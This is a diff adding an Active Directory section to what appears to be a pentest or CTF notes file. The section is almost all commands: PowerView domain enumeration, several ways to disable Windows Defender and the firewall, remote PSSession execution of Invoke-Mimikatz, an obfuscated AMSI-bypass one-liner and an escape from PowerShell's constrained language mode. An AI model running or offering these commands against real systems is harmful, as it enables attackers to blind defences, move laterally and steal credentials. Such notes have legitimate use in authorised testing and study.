@@ -150,6 +150,127 @@ Run in every new terminal opened:
 
     echo -e "
 
+# Active Directory
+
+> Metasploit 4 Exploitation, Empire 4 Post-Exploitation
+
+### Basic Enum (Powershell)
+
+\`\`\`
+Get-NetUser | select Name
+Get-NetGroup | select Name
+Get-NetComputer | select Name
+Get-NetGroupMember "Domain Admins"
+Invoke-ShareFinder
+Get-ObjectAcl -SamAccountName "Domain Admins"
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
+Get-NetOU select | name
+Get-NetDomainTrust
+Get-NetForestDomain
+Get-NetForestTrust
+Get-NetComputer -Domain domain_showed.local | select name
+Find-LocalAdminAccess
+Invoke-UserHunter
+\`\`\`
+
+### Defender
+
+\`\`\`
+Set-MpPreference -DisableRealtimeMonitoring $true
+\`\`\`
+
+or 
+
+\`\`\`
+Set-MpPreference -DisableIOAVProtection $true
+\`\`\`
+
+or
+
+\`\`\`
+sc stop WinDefend
+\`\`\`
+
+\`\`\`
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+\`\`\`
+
+or
+
+\`\`\`
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+
+can add
+
+-DisableRea $true
+\`\`\`
+
+### Firewall
+
+\`\`\`
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+\`\`\`
+
+### Applocker
+
+\`\`\`
+Get-AppLockerPolicy -Xml -Local
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleColletions
+\`\`\`
+
+### PSSession
+
+**make a new session**
+
+\`\`\`
+$sess = New-PSSession -ComputerName xxx.local
+\`\`\`
+
+**run commands**
+
+\`\`\`
+Invoke-Command -ScriptBlock {dir} -Session $sess
+\`\`\`
+
+**run scripts**
+
+\`\`\`
+Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
+Invoke-Command -FilePath "C:\Invoke-Mimikatz.ps1" -session $sess
+\`\`\`
+
+**join session**
+
+\`\`\`
+Enter-PSSession $sess
+\`\`\`
+
+
+**copy files to session**
+\`\`\`
+Copy-Item -Path C:\flag.txt -Destination 'C:\Users\Public\Music\flag.txt' -FromSession $sess
+\`\`\`
+
+### AMSI
+
+\`\`\`
+powershell -ep bypass
+\`\`\`
+
+or
+
+\`\`\`
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+\`\`\`
+
+### Powershell Language Mode
+
+\`\`\`
+$ExecutionContext.SessionState.LanguageMode
+powershell -version 2
+$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
+\`\`\`
+
 ### Bloodhound
 
 \`\`\`bash
